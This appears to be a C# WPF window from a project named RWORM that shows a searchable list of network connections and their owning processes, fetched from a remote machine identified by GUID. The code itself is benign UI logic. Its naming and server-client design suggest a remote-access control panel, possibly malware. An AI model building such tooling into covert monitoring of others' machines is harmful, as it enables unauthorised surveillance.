using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Windows;
using System.Windows.Controls;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public partial class NetMonitorWindow : Window
    {
        private readonly ServerConnection _server;
        private readonly string _guid;
        private List<ConnectionItemDto> _allConns = new();

        public class ConnectionItemDto
        {
            public string Protocol { get; set; } = "TCP";
            public string LocalAddress { get; set; } = string.Empty;
            public int LocalPort { get; set; }
            public string RemoteAddress { get; set; } = string.Empty;
            public int RemotePort { get; set; }
            public string State { get; set; } = string.Empty;
            public uint Pid { get; set; }
            public string ProcessName { get; set; } = string.Empty;
        }

        public NetMonitorWindow(ServerConnection server, string guid, string hostname)
        {
            InitializeComponent();
            _server = server;
            _guid = guid;
            Title = $"Network Connections — {hostname}";
            TitleLabel.Text = hostname;

            _server.RegisterNetHandler(_guid, OnNetReceived);
            _ = _server.RequestNetConnections(_guid);
            StatusLabel.Text = "Loading connections...";
        }

        private void OnNetReceived(byte[] data)
        {
            try
            {
                var json = Encoding.UTF8.GetString(data);
                var list = JsonSerializer.Deserialize<List<ConnectionItemDto>>(json,
                    new JsonSerializerOptions { PropertyNameCaseInsensitive = true }) ?? new List<ConnectionItemDto>();

                _allConns = list;
                Dispatcher.BeginInvoke(new Action(() =>
                {
                    ApplyFilter();
                    StatusLabel.Text = $"{_allConns.Count} active connections found.";
                }));
            }
            catch (Exception ex)
            {
                Dispatcher.BeginInvoke(new Action(() =>
                {
                    StatusLabel.Text = $"Error: {ex.Message}";
                }));
            }
        }

        private void ApplyFilter()
        {
            string q = SearchBox.Text?.Trim().ToLowerInvariant() ?? "";
            if (string.IsNullOrEmpty(q))
            {
                NetGrid.ItemsSource = _allConns;
            }
            else
            {
                NetGrid.ItemsSource = _allConns.Where(c =>
                    c.LocalAddress.Contains(q) ||
                    c.RemoteAddress.Contains(q) ||
                    c.LocalPort.ToString().Contains(q) ||
                    c.RemotePort.ToString().Contains(q) ||
                    c.State.ToLowerInvariant().Contains(q) ||
                    c.ProcessName.ToLowerInvariant().Contains(q)).ToList();
            }
        }

        private void SearchBox_TextChanged(object sender, TextChangedEventArgs e) => ApplyFilter();

        private void Refresh_Click(object sender, RoutedEventArgs e)
        {
            StatusLabel.Text = "Refreshing connections...";
            _ = _server.RequestNetConnections(_guid);
        }

        protected override void OnClosed(EventArgs e)
        {
            _server.UnregisterNetHandler(_guid);
            base.OnClosed(e);
        }
    }
}
